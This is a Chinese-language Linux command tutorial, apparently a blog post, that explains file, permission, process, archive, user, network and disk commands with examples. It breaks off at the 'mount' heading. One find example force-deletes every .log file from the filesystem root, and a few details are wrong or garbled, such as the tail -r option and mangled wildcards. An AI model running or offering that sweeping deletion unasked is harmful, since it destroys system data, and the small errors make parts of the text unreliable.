<h1 id="一-文件和目录管理命令"><a href="#一-文件和目录管理命令" class="headerlink" title="一.文件和目录管理命令"></a>一.文件和目录管理命令</h1><p>▐ ls - 列出目录内容<br>▐ cd - 更改当前工作目录<br>▐ pwd - 显示当前工作目录<br>▐ cp - 复制文件或目录<br>▐ mv - 移动或重命名文件或目录<br>▐ rm - 删除文件或目录<br>▐ mkdir - 创建目录<br>▐ rmdir - 删除空目录<br>▐ find - 查找文件或目录<br>▐ touch - 创建空文件或更新文件的时间戳</p>
<h1 id="二-文件内容操作命令"><a href="#二-文件内容操作命令" class="headerlink" title="二.文件内容操作命令"></a>二.文件内容操作命令</h1><p>▐ vi 和 vim<br>\1. 命令模式（Command Mode）<br>\2. 插入模式（Insert Mode）<br>\3. 底行模式（Last Line Mode）<br>▐ cat - 连接并显示文件内容<br>▐ more - 分页显示文件内容<br>▐ less - 分页显示文件内容（功能比more更强大）<br>▐ head - 显示文件的前几行<br>▐ tail - 显示文件的后几行<br>▐ grep - 在文件中搜索文本<br>▐ wc - 统计文件的行数、字数和字符数</p>
<h1 id="三-文件权限管理命令"><a href="#三-文件权限管理命令" class="headerlink" title="三.文件权限管理命令"></a>三.文件权限管理命令</h1><p>▐ chmod - 修改文件或目录的权限<br>▐ chown - 修改文件的所有者和组<br>▐ chgrp - 修改文件的所属组</p>
<h1 id="四-进程管理命令"><a href="#四-进程管理命令" class="headerlink" title="四.进程管理命令"></a>四.进程管理命令</h1><p>▐ ps：显示当前运行的进程<br>▐ top：实时显示系统资源使用情况<br>▐ kill：终止进程</p>
<h1 id="五-压缩和归档命令"><a href="#五-压缩和归档命令" class="headerlink" title="五.压缩和归档命令"></a>五.压缩和归档命令</h1><p>▐ tar：创建归档文件并支持压缩<br>▐ gzip：文件压缩工具<br>▐ bzip2：高效文件压缩工具<br>▐ xz：高效文件压缩工具<br>▐ zip：创建压缩归档文件<br>▐ unzip：解压缩 zip 归档文件</p>
<h1 id="六-用户管理命令"><a href="#六-用户管理命令" class="headerlink" title="六.用户管理命令"></a>六.用户管理命令</h1><p>▐ who：显示当前登录的用户<br>▐ useradd：添加新用户<br>▐ usermod：修改用户信息<br>▐ userdel：删除用户<br>▐ groupadd：添加新组<br>▐ groupdel：删除组<br>▐ passwd：修改用户密码<br>▐ su：切换用户<br>▐ sudo：以超级用户权限执行命令<br>▐ id：显示用户和组信息</p>
<h1 id="七-网络管理命令"><a href="#七-网络管理命令" class="headerlink" title="七.网络管理命令"></a>七.网络管理命令</h1><p>▐ ifconfig：配置网络接口<br>▐ ip：显示和操作路由、设备、策略路由等<br>▐ ping：检查网络连通性<br>▐ traceroute：跟踪路由路径<br>▐ netstat：显示网络连接、路由表、接口状态等</p>
<h1 id="八-磁盘管理命令"><a href="#八-磁盘管理命令" class="headerlink" title="八.磁盘管理命令"></a>八.磁盘管理命令</h1><p>▐ df：显示文件系统的磁盘空间使用情况<br>▐ fdisk：磁盘分区管理<br>▐ parted：高级磁盘分区管理<br>▐ mkfs：创建文件系统<br>▐ mount：挂载文件系统<br>▐ umount：卸载文件系统</p>
<h1 id="九-程序安装和包管理命令"><a href="#九-程序安装和包管理命令" class="headerlink" title="九.程序安装和包管理命令"></a>九.程序安装和包管理命令</h1><p>▐ 1. apt-get&#x2F;apt：Debian系发行版的<a href="https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782&utm_source=glcblog&spm=1001.2101.3001.7020">软件</a>包管理工具<br>apt-get<br>apt<br>▐ 2. yum&#x2F;dnf：Red Hat系发行版的软件包管理工具<br>yum<br>dnf<br>▐ 3. rpm：Red Hat Package Manager，用于安装、卸载和管理RPM包</p>
<h1 id="一-文件和目录管理命令-1"><a href="#一-文件和目录管理命令-1" class="headerlink" title="一.文件和目录管理命令"></a>一.文件和目录管理命令</h1><p>这部分命令及其选项涵盖了文件和目录管理的常见操作，掌握这些命令就可以有效地管理和操作Linux系统中的文件和目录。<br>▐ ls - 列出目录内容</p>
<p>用法：<br>ls [选项] [目录]<br>常用选项：<br>-l：使用长格式列出文件信息。<br>-a：显示所有文件，包括隐藏文件。<br>-h：以人类可读的格式显示文件大小。<br>-R：递归列出目录及其子目录中的内容。<br>示例：<br>ls -l<br>ls -a &#x2F;home&#x2F;user<br>ls -lh &#x2F;var&#x2F;log<br>▐ cd - 更改当前工作目录</p>
<p>用法：<br>cd [目录]<br>示例：<br>cd &#x2F;home&#x2F;user<br>cd ..<br>cd ~<br>▐ pwd - 显示当前工作目录</p>
<p>用法：<br>pwd<br>▐ cp - 复制文件或目录</p>
<p>用法：<br>cp [选项] 源文件 目标文件<br>cp [选项] 源文件… 目标目录<br>常用选项：<br>-r：递归复制目录及其内容。<br>-i：在覆盖文件前提示确认。<br>-u：仅在源文件比目标文件新或目标文件不存在时复制。<br>示例：<br>cp file1.txt file2.txt<br>cp -r dir1 dir2<br>cp -i file1.txt &#x2F;backup&#x2F;<br>▐ mv - 移动或重命名文件或目录</p>
<p>用法：<br>mv [选项] 源文件 目标文件<br>mv [选项] 源文件… 目标目录<br>常用选项：<br>-i：在覆盖文件前提示确认。<br>-u：仅在源文件比目标文件新或目标文件不存在时移动。<br>示例：<br>mv oldname.txt newname.txt<br>mv file1.txt file2.txt &#x2F;backup&#x2F;<br>▐ rm - 删除文件或目录</p>
<p>用法：<br>rm [选项] 文件…<br>常用选项：<br>-r：递归删除目录及其内容。<br>-f：强制删除，不提示确认。<br>-i：删除前逐个文件提示确认。<br>示例：<br>rm file1.txt<br>rm -r directory&#x2F;<br>rm -f file1.txt<br>▐ mkdir - 创建目录</p>
<p>用法：<br>mkdir [选项] 目录…<br>常用选项：<br>-p：递归创建目录，包括必要的父目录。<br>示例：<br>mkdir newdir<br>mkdir -p &#x2F;newdir&#x2F;subdir<br>▐ rmdir - 删除空目录</p>
<p>用法：<br>rmdir [选项] 目录…<br>示例：<br>rmdir emptydir<br>▐ find - 查找文件或目录</p>
<p>用法：<br>find [路径] [选项] [表达式]<br>常用选项：<br>-name：按名称查找文件。<br>-type：按类型查找（f为文件，d为目录）。<br>-size：按大小查找文件。<br>-mtime：按修改时间查找文件。<br>-exec：对查找到的文件执行指定的命令。<br>示例：<br>find &#x2F;home -name “<em>.txt”<br>find &#x2F;var&#x2F;log -type f -size +1M<br>find &#x2F;tmp -mtime -1<br>find &#x2F; -type f -name “</em>.log” -exec rm -f {} ;<br>▐ touch - 创建空文件或更新文件的时间戳</p>
<p>用法：<br>touch [选项] 文件…<br>常用选项：<br>-a：仅更新访问时间。<br>-m：仅更新修改时间。<br>示例：<br>touch newfile.txt<br>touch -a -m existingfile.txt</p>
<h1 id="二-文件内容操作命令-1"><a href="#二-文件内容操作命令-1" class="headerlink" title="二.文件内容操作命令"></a>二.文件内容操作命令</h1><p>下面是Linux中用于查看和遍历文件内容的命令的详细介绍，包括每个命令的基本用法和常见选项。<br>▐ vi 和 vim </p>
<p>这里要对vi 和 vim 单独说一下，vi 和 vim 是 Linux 系统中常用的文本编辑器，其中 vim 是 vi 的增强版，提供了更多的功能和改进。vi 有三种主要模式，它们分别是命令模式（Command Mode）、插入模式（Insert Mode）和底行模式（Last Line Mode）。以下是每种模式的详细解释：<br>\1. 命令模式（Command Mode）</p>
<dl><dt>解释： 命令模式是 vi 和 vim 的默认模式。当你第一次启动 vi 或 vim 时，编辑器处于命令模式。在此模式下，你可以执行各种命令来导航、删除、复制、粘贴文本等。<br>特点：<br>导航：可以使用 h、j、k、l 键来移动光标。<br>删除文本：例如，使用 x 删除当前字符，使用 dd 删除当前行。<br>复制文本：例如，使用 yy 复制当前行。<br>粘贴文本：例如，使用 p 粘贴文本。<br>切换模式：可以通过按 i、a、o 等命令进入插入模式，或者按 : 进入底行模式。<br>示例：<br>h    # 左移一个字符<br>j    # 下移一行<br>k    # 上移一行<br>l    # 右移一个字符<br>dd   # 删除当前行<br>yy   # 复制当前行<br>p    # 粘贴文本<br>i    # 进入插入模式</dt><dd># 进入底行模式<br>\2. 插入模式（Insert Mode）</dd></dl><p>解释： 插入模式用于插入和编辑文本。在命令模式下，通过按 i、a、o 等命令可以进入插入模式。进入插入模式后，所有键入的字符都会直接插入到文本中。<br>特点：<br>插入文本：可以在光标当前位置、光标后面、新行等位置插入文本。<br>退出模式：按 Esc 键可以退出插入模式，返回命令模式。<br>示例：<br>i    # 在光标前插入文本<br>a    # 在光标后插入文本<br>o    # 在当前行下方新开一行并插入文本<br>O    # 在当前行上方新开一行并插入文本<br>Esc   # 退出插入模式，返回命令模式<br>\3. 底行模式（Last Line Mode）</p>
<p>解释： 底行模式用于执行文件保存、退出、搜索、替换等命令。在命令模式下，通过按 :、&#x2F; 或 ? 可以进入底行模式。进入底行模式后，光标移动到编辑器底部，显示一个命令提示符。<br>特点：<br>文件操作：保存文件、退出编辑器等。<br>搜索文本：在文件中搜索特定文本。<br>替换文本：在文件中替换特定文本。<br>执行命令：按 Enter 键执行命令。<br>示例：<br>:w     # 保存文件<br>:q     # 退出编辑器<br>:wq     # 保存并退出<br>:q!     # 强制退出（不保存）<br>&#x2F;pattern  # 搜索模式，向下查找<br>?pattern  # 搜索模式，向上查找<br>:s&#x2F;old&#x2F;new # 替换当前行的第一个匹配<br>:%s&#x2F;old&#x2F;new&#x2F;g  # 替换整个文件的所有匹配<br>▐ cat - 连接并显示文件内容</p>
<p>用法：<br>cat [选项] 文件…<br>常用选项：<br>-n：显示行号。<br>-b：对非空输出行编号。<br>-s：压缩连续的空行。<br>-E：在每行末尾显示 $。<br>示例：<br>cat file1.txt<br>cat file1.txt file2.txt &gt; merged.txt<br>cat -n file1.txt<br>▐ more - 分页显示文件内容</p>
<p>用法：<br>more [选项] 文件…<br>常用选项：<br>-d：显示”Press space to continue…”提示。<br>-num：指定每页显示的行数。<br>-s：压缩连续的空行。<br>示例：<br>more file1.txt<br>more -d file1.txt<br>▐ less - 分页显示文件内容（功能比more更强大）</p>
<p>用法：<br>less [选项] 文件…<br>常用选项：<br>-N：显示行号。<br>-I：忽略搜索时的大小写。<br>-S：禁止自动换行。<br>示例：<br>less file1.txt<br>less -N file1.txt<br>▐ head - 显示文件的前几行</p>
<p>用法：<br>head [选项] 文件…<br>常用选项：<br>-n：指定显示的行数。<br>-c：指定显示的字节数。<br>示例：<br>head file1.txt<br>head -n 20 file1.txt<br>head -c 50 file1.txt<br>▐ tail - 显示文件的后几行</p>
<p>用法：<br>tail [选项] 文件…<br>常用选项：<br>-n：指定显示的行数。<br>-c：指定显示的字节数。<br>-f：实时显示文件内容，常用于查看日志文件。<br>-r：倒序显示文件内容。<br>示例：<br>tail file1.txt<br>tail -n 20 file1.txt<br>tail -f &#x2F;var&#x2F;log&#x2F;syslog<br>tail -c 100 file1.txt<br>▐ grep - 在文件中搜索文本</p>
<p>用法：<br>grep [选项] 模式 文件…<br>常用选项：<br>-i：忽略大小写。<br>-r：递归搜索目录。<br>-v：显示不匹配的行。<br>-n：显示行号。<br>-l：只显示包含匹配的文件名。<br>-c：显示匹配的行数。<br>-H：显示匹配的文件名。<br>-o：只输出匹配部分。<br>示例：<br>grep “search_term” file1.txt<br>grep -i “search_term” file1.txt<br>grep -r “search_term” &#x2F;var&#x2F;log&#x2F;<br>grep -v “search_term” file1.txt<br>grep -n “search_term” file1.txt<br>grep -l “search_term” *<br>▐ wc - 统计文件的行数、字数和字符数</p>
<p>用法：<br>wc [选项] 文件…<br>常用选项：<br>-l：显示行数。<br>-w：显示字数。<br>-c：显示字节数。<br>-m：显示字符数。<br>示例：<br>wc file1.txt<br>wc -l file1.txt<br>wc -w file1.txt<br>wc -c file1.txt</p>
<h1 id="三-文件权限管理命令-1"><a href="#三-文件权限管理命令-1" class="headerlink" title="三.文件权限管理命令"></a>三.文件权限管理命令</h1><p>在Linux系统中，文件权限管理是非常重要的一部分。它控制了谁可以读取、写入或执行文件和目录。Linux文件权限包括三个部分：文件的所有者、文件所属的组以及其他用户。每个部分都有三种权限：<br>读（r）：允许读取文件内容或列出目录内容。<br>写（w）：允许修改文件内容或在目录中创建、删除、重命名文件。<br>执行（x）：允许执行文件（如果是可执行文件）或访问目录。<br>权限通常表示为一个十位的字符串，如 -rwxr-xr–，其中：<br>第一位表示文件类型（例如，- 表示普通文件，d 表示目录）。<br>接下来的九位分为三组，每组三位，分别表示所有者、组、其他用户的权限。<br>查看文件权限<br>ls 命令<br>查看文件权限通常使用 ls 命令：<br>ls -l<br>输出示例：<br>-rw-r–r– 1 user group 4096 May 19 12:34 file.txt<br>▐ chmod - 修改文件或目录的权限</p>
<p>用法：<br>chmod [who] [operation] [permission] file<br>其中：<br>who：权限修改对象，u（用户），g（组），o（其他），a（所有）。<br>operation：+（添加权限），-（移除权限），&#x3D;（设置权限）。<br>permission：r（读），w（写），x（执行）。<br>示例：<br>chmod u+x file.txt   # 为文件所有者添加执行权限<br>chmod g-w file.txt   # 移除组的写权限<br>chmod o&#x3D;r file.txt   # 设置其他用户只读权限<br>chmod a+r file.txt   # 为所有用户添加读权限<br>八进制模式：<br>chmod [mode] file<br>mode 是一个三位的八进制数，每位代表不同的权限：<br>读（r）：4<br>写（w）：2<br>执行（x）：1<br>示例：<br>chmod 755 file.txt   # 设置文件权限为 -rwxr-xr-x<br>chmod 644 file.txt   # 设置文件权限为 -rw-r–r–<br>▐ chown - 修改文件的所有者和组</p>
<p>用法：<br>chown [选项] [新所有者] [:新组] 文件<br>示例：<br>chown user file.txt       # 修改文件所有者为 user<br>chown user:group file.txt    # 修改文件所有者为 user，组为 group<br>chown :group file.txt      # 仅修改文件所属组为 group<br>chown -R user:group &#x2F;path&#x2F;to&#x2F;dir # 递归修改目录及其子文件夹和文件的所有者和组<br>▐ chgrp - 修改文件的所属组</p>
<p>用法：<br>chgrp [选项] 新组 文件<br>示例：<br>chgrp group file.txt      # 修改文件所属组为 group<br>chgrp -R group &#x2F;path&#x2F;to&#x2F;dir   # 递归修改目录及其子文件夹和文件的所属组</p>
<h1 id="四-进程管理命令-1"><a href="#四-进程管理命令-1" class="headerlink" title="四.进程管理命令"></a>四.进程管理命令</h1><p>▐ ps：显示当前运行的进程</p>
<p>用法：<br>ps [选项]<br>常用选项：<br>-e 或 -A：显示所有进程。<br>-f：显示完整格式的输出，包括PPID、C、STIME、TTY、TIME、CMD。<br>-u 用户：显示特定用户的进程。<br>-p PID：显示指定PID的进程。<br>示例：<br>ps -ef  # 显示所有进程的完整格式<br>ps -aux  # 显示所有进程，包括详细信息<br>▐ top：实时显示系统资源使用情况</p>
<p>用法：<br>top<br>特点：<br>默认情况下，每隔几秒钟更新一次系统的进程信息。<br>显示CPU、内存使用情况和每个进程的信息。<br>常用操作：<br>q：退出 top。<br>h：显示帮助。<br>k：终止一个进程。<br>r：重新调整进程的优先级（renice）。<br>示例：<br>top  # 启动top，实时显示系统资源使用情况<br>▐ kill：终止进程</p>
<p>用法：<br>kill [选项] PID<br>常用选项：<br>-9：强制终止进程。<br>-15：发送TERM信号（默认），请求进程终止。<br>示例：<br>kill 1234     # 终止进程ID为1234的进程<br>kill -9 1234    # 强制终止进程ID为1234的进程</p>
<h1 id="五-压缩和归档命令-1"><a href="#五-压缩和归档命令-1" class="headerlink" title="五.压缩和归档命令"></a>五.压缩和归档命令</h1><p>在Linux中，压缩和归档命令是管理文件和目录的重要工具。常见的压缩和归档命令包括 tar、gzip、bzip2、xz 和 zip 等。这些工具可以单独使用，也可以组合使用，以便创建压缩的归档文件。<br>▐ tar：创建归档文件并支持压缩</p>
<p>tar（tape archive）命令用于创建、提取和管理归档文件。<br>用法：<br>tar [选项] [归档文件] [文件或目录]<br>常用选项：<br>-c：创建新的归档文件。<br>-x：解压归档文件。<br>-t：列出归档文件内容。<br>-v：显示详细信息。<br>-f：指定归档文件名。<br>-z：使用 gzip 压缩或解压缩。<br>-j：使用 bzip2 压缩或解压缩。<br>-J：使用 xz 压缩或解压缩。<br>-C：指定解压到的目录。<br>示例：<br># 创建 tar 归档文件<br>tar -cvf archive.tar file1 file2 directory&#x2F;</p>
<p># 创建 gzip 压缩的 tar 归档文件<br>tar -czvf archive.tar.gz file1 file2 directory&#x2F;</p>
<p># 创建 bzip2 压缩的 tar 归档文件<br>tar -cjvf archive.tar.bz2 file1 file2 directory&#x2F;</p>
<p># 创建 xz 压缩的 tar 归档文件<br>tar -cJvf archive.tar.xz file1 file2 directory&#x2F;</p>
<p># 解压 tar 归档文件<br>tar -xvf archive.tar</p>
<p># 解压 gzip 压缩的 tar 归档文件<br>tar -xzvf archive.tar.gz</p>
<p># 解压 bzip2 压缩的 tar 归档文件<br>tar -xjvf archive.tar.bz2</p>
<p># 解压 xz 压缩的 tar 归档文件<br>tar -xJvf archive.tar.xz</p>
<p># 列出 tar 归档文件内容<br>tar -tvf archive.tar</p>
<p># 解压到指定目录<br>tar -xvf archive.tar -C &#x2F;path&#x2F;to&#x2F;directory<br>▐ gzip：文件压缩工具</p>
<p>gzip（GNU zip）用于压缩单个文件。<br>用法：<br>gzip [选项] [文件]<br>常用选项：<br>-d：解压文件。<br>-k：保留原文件。<br>-r：递归压缩目录中的所有文件。<br>示例：<br># 压缩文件<br>gzip file</p>
<p># 解压文件<br>gzip -d file.gz</p>
<p># 压缩并保留原文件<br>gzip -k file</p>
<p># 递归压缩目录中的所有文件<br>gzip -r directory&#x2F;<br>▐ bzip2：高效文件压缩工具</p>
<p>bzip2 用于压缩单个文件，通常比 gzip 压缩率更高，但速度较慢。<br>用法：<br>bzip2 [选项] [文件]<br>常用选项：<br>-d：解压文件。<br>-k：保留原文件。<br>示例：<br># 压缩文件<br>bzip2 file</p>
<p># 解压文件<br>bzip2 -d file.bz2</p>
<p># 压缩并保留原文件<br>bzip2 -k file<br>▐ xz：高效文件压缩工具</p>
<p>xz 用于压缩单个文件，压缩率比 gzip 和 bzip2 更高，但速度较慢。<br>用法：<br>xz [选项] [文件]<br>常用选项：<br>-d：解压文件。<br>-k：保留原文件。<br>-z：压缩文件（默认行为）。<br>-T：指定使用的线程数。<br>示例：<br># 压缩文件<br>xz file</p>
<p># 解压文件<br>xz -d file.xz</p>
<p># 压缩并保留原文件<br>xz -k file</p>
<p># 使用多线程压缩文件<br>xz -T4 file<br>▐ zip：创建压缩归档文件</p>
<p>zip 命令用于创建压缩归档文件，支持多文件和目录。<br>用法：<br>zip [选项] [归档文件] [文件或目录]<br>常用选项：<br>-r：递归压缩目录。<br>-d：从归档文件中删除文件。<br>-u：更新归档文件中的文件。<br>-m：压缩后删除原文件。<br>示例：<br># 创建 zip 归档文件<br>zip archive.zip file1 file2 directory&#x2F;</p>
<p># 递归压缩目录<br>zip -r archive.zip directory&#x2F;</p>
<p># 从归档文件中删除文件<br>zip -d archive.zip file1</p>
<p># 更新归档文件中的文件<br>zip -u archive.zip file1</p>
<p># 压缩后删除原文件<br>zip -m archive.zip file1<br>▐ unzip：解压缩 zip 归档文件</p>
<p>unzip 命令用于解压缩 zip 归档文件。<br>用法：<br>unzip [选项] [归档文件]<br>常用选项：<br>-d：指定解压到的目录。<br>-l：列出归档文件内容。<br>-o：覆盖已存在的文件。<br>示例：<br># 解压 zip 归档文件<br>unzip archive.zip</p>
<p># 解压到指定目录<br>unzip archive.zip -d &#x2F;path&#x2F;to&#x2F;directory</p>
<p># 列出 zip 归档文件内容<br>unzip -l archive.zip</p>
<p># 覆盖已存在的文件<br>unzip -o archive.zip</p>
<h1 id="六-用户管理命令-1"><a href="#六-用户管理命令-1" class="headerlink" title="六.用户管理命令"></a>六.用户管理命令</h1><p>在Linux中，用户管理命令用于管理用户账户和用户组，确保系统的安全和资源的有效分配。<br>▐ who：显示当前登录的用户</p>
<p>用法：<br>who [选项]<br>常用选项：<br>-H：显示列标题。<br>-q：显示登录用户的数量和名称。<br>-b：显示系统最后的启动时间。<br>示例：<br>who     # 显示当前登录的用户<br>who -q    # 显示当前登录用户的数量和名称<br>who -b    # 显示系统最后的启动时间<br>▐ useradd：添加新用户</p>
<p>useradd 命令用于在系统中添加新用户。<br>用法：<br>useradd [选项] 用户名<br>常用选项：<br>-m：创建用户的主目录。<br>-d 目录：指定用户的主目录。<br>-s shell：指定用户的登录 shell。<br>-g 组：指定用户的主组。<br>-G 组1,组2,…：指定用户的附加组。<br>-u 用户ID：指定用户ID。<br>-c “描述”：添加用户描述信息。<br>示例：<br># 添加新用户并创建主目录<br>useradd -m newuser</p>
<p># 添加新用户，指定主目录和登录 shell<br>useradd -m -d &#x2F;home&#x2F;customdir -s &#x2F;bin&#x2F;bash newuser</p>
<p># 添加新用户，指定主组和附加组<br>useradd -m -g users -G wheel,audio,video newuser<br>▐ usermod：修改用户信息</p>
<p>usermod 命令用于修改现有用户的信息。<br>用法：<br>usermod [选项] 用户名<br>常用选项：<br>-l 新用户名：更改用户名。<br>-d 新目录：更改用户主目录。<br>-m：移动用户主目录到新位置。<br>-s 新shell：更改用户的登录 shell。<br>-g 新组：更改用户的主组。<br>-G 新组1,新组2,…：更改用户的附加组。<br>-u 新用户ID：更改用户ID。<br>-c “新描述”：更改用户描述信息。<br>示例：<br># 更改用户名<br>usermod -l newusername oldusername</p>
<p># 更改用户主目录并移动内容<br>usermod -d &#x2F;new&#x2F;home&#x2F;directory -m username</p>
<p># 更改用户登录 shell<br>usermod -s &#x2F;bin&#x2F;zsh username</p>
<p># 更改用户主组和附加组<br>usermod -g newgroup -G newgroup1,newgroup2 username<br>▐ userdel：删除用户</p>
<p>userdel 命令用于从系统中删除用户。<br>用法：<br>userdel [选项] 用户名<br>常用选项：<br>-r：删除用户的主目录和邮件池。<br>示例：<br># 删除用户但保留主目录<br>userdel username</p>
<p># 删除用户并删除主目录<br>userdel -r username<br>▐ groupadd：添加新组</p>
<p>groupadd 命令用于在系统中添加新组。<br>用法：<br>groupadd [选项] 组名<br>常用选项：<br>-g 组ID：指定组ID。<br>示例：<br># 添加新组<br>groupadd newgroup</p>
<p># 添加新组并指定组ID<br>groupadd -g 1001 newgroup<br>▐ groupdel：删除组</p>
<p>groupdel 命令用于从系统中删除组。<br>用法：<br>groupdel 组名<br> 示例：<br># 删除组<br>groupdel oldgroup<br>▐ passwd：修改用户密码</p>
<p>passwd 命令用于修改用户密码。<br>用法：<br>passwd [用户名]<br>示例：<br># 修改当前用户的密码<br>passwd</p>
<p># 修改指定用户的密码（需要超级用户权限）<br>passwd username<br>▐ su：切换用户</p>
<p>su 命令用于切换到另一个用户的身份。<br>用法：<br>su [选项] [用户名]<br>常用选项：<br>-：切换到用户并加载该用户的环境变量。<br>示例：<br># 切换到 root 用户<br>su -</p>
<p># 切换到指定用户<br>su username<br>▐ sudo：以超级用户权限执行命令</p>
<p>sudo 命令用于以超级用户或其他用户的身份执行命令。<br>用法：<br>sudo [选项] 命令<br>常用选项：<br>-u 用户：以指定用户的身份执行命令。<br>-s：启动交互式 shell。<br>示例：<br># 以超级用户权限执行命令<br>sudo command</p>
<p># 以指定用户身份执行命令<br>sudo -u username command</p>
<p># 启动超级用户的交互式 shell<br>sudo -s<br>▐ id：显示用户和组信息</p>
<p>id 命令用于显示指定用户或当前用户的ID、组ID和附加组信息。<br>用法：<br>id [选项] [用户名]<br>常用选项：<br>-u：显示用户ID。<br>-g：显示组ID。<br>-G：显示所有组ID。<br>-n：显示名称而不是数字ID。<br>示例：<br># 显示当前用户的信息<br>id</p>
<p># 显示指定用户的信息<br>id username</p>
<p># 显示当前用户的用户ID<br>id -u</p>
<p># 显示当前用户的所有组ID<br>id -G</p>
<h1 id="七-网络管理命令-1"><a href="#七-网络管理命令-1" class="headerlink" title="七.网络管理命令"></a>七.网络管理命令</h1><p>在Linux中，网络管理命令用于配置、管理和监控网络接口、路由、连接状态等。<br>▐ ifconfig：配置网络接口</p>
<p>ifconfig 命令用于显示或配置网络接口。<br>用法：<br>ifconfig [接口] [选项]<br>常用选项：<br>up：启动网络接口。<br>down：关闭网络接口。<br>inet 地址：设置接口的IP地址。<br>netmask 地址：设置接口的子网掩码。<br>broadcast 地址：设置接口的广播地址。<br>示例：<br># 显示所有网络接口的信息<br>ifconfig</p>
<p># 启动网络接口 eth0<br>ifconfig eth0 up</p>
<p># 关闭网络接口 eth0<br>ifconfig eth0 down</p>
<p># 配置网络接口 eth0 的IP地址、子网掩码和广播地址<br>ifconfig eth0 192.168.1.100 netmask 255.255.255.0 broadcast 192.168.1.255<br>▐ ip：显示和操作路由、设备、策略路由等</p>
<p>ip 命令是 ifconfig 的现代替代品，功能更强大。<br>用法：<br>ip [选项] 对象 命令<br>常用对象和命令：<br>addr：管理IP地址。<br>show：显示地址。<br>add：添加地址。<br>del：删除地址。<br>link：管理网络接口。<br>show：显示接口。<br>set：设置接口状态（up&#x2F;down）。<br>route：管理路由表。<br>show：显示路由。<br>add：添加路由。<br>del：删除路由。<br>示例：<br># 显示所有网络接口的信息<br>ip addr show</p>
<p># 显示接口 eth0 的信息<br>ip addr show eth0</p>
<p># 启动网络接口 eth0<br>ip link set eth0 up</p>
<p># 关闭网络接口 eth0<br>ip link set eth0 down</p>
<p># 添加IP地址到接口 eth0<br>ip addr add 192.168.1.100&#x2F;24 dev eth0</p>
<p># 删除接口 eth0 上的IP地址<br>ip addr del 192.168.1.100&#x2F;24 dev eth0</p>
<p># 显示路由表<br>ip route show</p>
<p># 添加默认网关<br>ip route add default via 192.168.1.1</p>
<p># 删除默认网关<br>ip route del default<br>▐ ping：检查网络连通性</p>
<p>ping 命令用于测试与目标主机的连通性。<br>用法：<br>ping [选项] 目标<br>常用选项：<br>-c 次数：指定发送的ICMP请求数。<br>-i 间隔：指定每次请求间的间隔时间。<br>-s 大小：指定ICMP数据包的大小。<br>示例：<br># ping 一个主机，直到手动停止<br>ping <a href="http://www.example.com/">www.example.com</a></p>
<p># ping 一个主机5次<br>ping -c 5 <a href="http://www.example.com/">www.example.com</a></p>
<p># 每隔0.5秒 ping 一次<br>ping -i 0.5 <a href="http://www.example.com/">www.example.com</a><br>▐ traceroute：跟踪路由路径</p>
<p>traceroute 命令用于显示数据包到目标主机的路径。<br>用法：<br>traceroute [选项] 目标<br>常用选项：<br>-n：使用IP地址而非主机名。<br>-m 最大跳数：设置最大跳数。<br>示例：<br># 跟踪到目标主机的路由<br>traceroute <a href="http://www.example.com/">www.example.com</a></p>
<p># 跟踪到目标主机的路由，使用IP地址<br>traceroute -n <a href="http://www.example.com/">www.example.com</a><br>▐ netstat：显示网络连接、路由表、接口状态等</p>
<p>netstat 命令用于显示各种网络相关信息。<br>用法：<br>netstat [选项]<br>常用选项：<br>-a：显示所有连接和监听端口。<br>-t：显示TCP连接。<br>-u：显示UDP连接。<br>-n：以数字形式显示地址和端口。<br>-r：显示路由表。<br>-i：显示网络接口信息。<br>示例：<br># 显示所有连接和监听端口<br>netstat -a</p>
<p># 显示所有TCP连接<br>netstat -t</p>
<p># 显示所有UDP连接<br>netstat -u</p>
<p># 显示所有连接和监听端口，以数字形式<br>netstat -an</p>
<p># 显示路由表<br>netstat -r</p>
<p># 显示网络接口信息<br>netstat -i</p>
<h1 id="八-磁盘管理命令-1"><a href="#八-磁盘管理命令-1" class="headerlink" title="八.磁盘管理命令"></a>八.磁盘管理命令</h1><p>在Linux中，磁盘管理命令用于查看、配置和管理磁盘和文件系统。<br>▐ df：显示文件系统的磁盘空间使用情况</p>
<p>用法：<br>df [选项] [文件]<br>常用选项：<br>-h：以人类可读的格式显示磁盘使用情况。<br>-T：显示文件系统类型。<br>示例：<br>df -h   # 以人类可读的格式显示所有挂载的文件系统的磁盘使用情况<br>df -Th   # 显示所有挂载的文件系统的磁盘使用情况和类型<br>▐ fdisk：磁盘分区管理</p>
<p>fdisk 命令用于查看和编辑磁盘分区表。<br>用法：<br>fdisk [选项] 设备<br>常用选项：<br>-l：列出所有磁盘及其分区信息。<br>-u：显示分区大小以扇区为单位。<br>示例：<br># 显示所有磁盘及其分区信息<br>fdisk -l</p>
<p># 编辑磁盘 &#x2F;dev&#x2F;sda 的分区表<br>fdisk &#x2F;dev&#x2F;sda<br>常用交互命令：<br>n：创建新分区。<br>d：删除分区。<br>p：打印分区表。<br>w：写入分区表并退出。<br>q：退出但不保存更改。<br>▐ parted：高级磁盘分区管理</p>
<p>parted 命令用于创建和管理磁盘分区，支持更多类型的分区表。<br>用法：<br>parted [设备] [命令]<br>常用命令：<br>mklabel：创建新的分区表。<br>mkpart：创建新分区。<br>print：显示分区表。<br>rm：删除分区。<br>resizepart：调整分区大小。<br>示例：<br># 进入交互模式编辑磁盘 &#x2F;dev&#x2F;sda<br>parted &#x2F;dev&#x2F;sda</p>
<p># 在交互模式下显示分区表<br>(parted) print</p>
<p># 创建新的 GPT 分区表<br>(parted) mklabel gpt</p>
<p># 创建新分区<br>(parted) mkpart primary ext4 0% 100%<br>▐ mkfs：创建文件系统</p>
<p>mkfs 命令用于在分区上创建新的文件系统。<br>用法：<br>mkfs -t 文件系统类型 设备<br>常用文件系统类型：<br>ext4：第四代扩展文件系统。<br>xfs：XFS 文件系统。<br>vfat：FAT 文件系统。<br>示例：<br># 在分区 &#x2F;dev&#x2F;sda1 上创建 ext4 文件系统<br>mkfs -t ext4 &#x2F;dev&#x2F;sda1</p>
<p># 在分区 &#x2F;dev&#x2F;sdb1 上创建 xfs 文件系统<br>mkfs -t xfs &#x2F;dev&#x2F;sdb1</p>
<p># 在分区 &#x2F;dev&#x2F;sdc1 上创建 vfat 文件系统<br>mkfs -t vfat &#x2F;dev&#x2F;sdc1<br>▐ mount：挂载文件系统</p>
